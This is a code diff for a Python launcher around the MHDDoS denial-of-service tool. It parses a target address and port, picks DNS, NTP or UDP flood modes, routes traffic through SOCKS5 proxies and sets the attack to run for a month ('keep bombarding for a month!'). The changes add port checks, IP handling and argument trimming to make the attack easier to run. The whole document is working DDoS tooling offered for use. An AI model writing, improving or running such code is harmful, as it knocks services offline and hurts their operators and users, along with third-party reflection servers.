@@ -4,7 +4,7 @@ from sys import argv
 from humanfriendly.terminal import ansi_wrap
 
 from MHDDoS.start import start, ToolsConsole
-from utils import print_vpn_warning, supports_color
+from utils import print_vpn_warning, supports_color, is_valid_ipv4
 
 
 def print_flair():
@@ -51,23 +51,31 @@ def kara():
     default_protocol = None
     if len(argv) > 2:
         port = argv[2]
-        if port == "53" or port == "5353":
+
+        try:
+            port = int(port)
+        except ValueError:
+            print(f"Invalid port specified ({port}). Port must be an integer value in range [1..65535]. Aborting execution.")
+            sys.exit(1)
+
+        if port == 53 or port == 5353:
             default_protocol = "DNS"
             print(f"Port provided ({port}). It's a DNS port. Defaulting to DNS mode...")
-        elif port == "123":
+        elif port == 123:
             default_protocol = "NTP"
             print(f"Port provided ({port}). It's an NTP port. Defaulting to NTP mode...")
         else:
             default_protocol = "UDP"
             print(f"Port provided ({port}). Using UDP mode...")
 
-        # If we have a port, we need to get an IP of the target
-        dns_info = ToolsConsole.info(address)
-        if not dns_info["success"]:
-            print(f"Port provided, but IP address of '{address}' could not be found. Cannot proceed.")
-            sys.exit(1)
+        # If we have the port, bot no IP address, we need to get the IP of the target
+        if not is_valid_ipv4(address):
+            dns_info = ToolsConsole.info(address)
+            if not dns_info["success"]:
+                print(f"Port provided, but IP address of '{address}' could not be found. Cannot proceed.")
+                sys.exit(1)
 
-        address = dns_info['ip']
+            address = dns_info['ip']
 
     # Parse protocol
     protocol = default_protocol
@@ -93,12 +101,20 @@ def kara():
         argv.insert(5, "socks5.txt")
         argv.insert(6, f"{hardcoded_n_requests}")
         argv.insert(7, "44640")  # keep bombarding for a month!
+
+        # Remove excess arguments
+        while len(argv) > 8:
+            argv.pop(-1)
     else:
         # Prepare IP attack arguments
         argv[1] = f"{protocol if protocol else default_protocol}"
         argv.insert(2, f"{address}:{port}")
         argv.insert(3, f"{hardcoded_n_threads}")
-        argv.insert(4, f"{hardcoded_n_requests}")
+        argv.insert(4, "44640")  # keep bombarding for a month!
+
+        # Remove excess arguments
+        while len(argv) > 5:
+            argv.pop(-1)
 
     print()
     print(f"Initiating attack with the following MHDDoS parameters:\n     {' '.join(argv[1:])}")
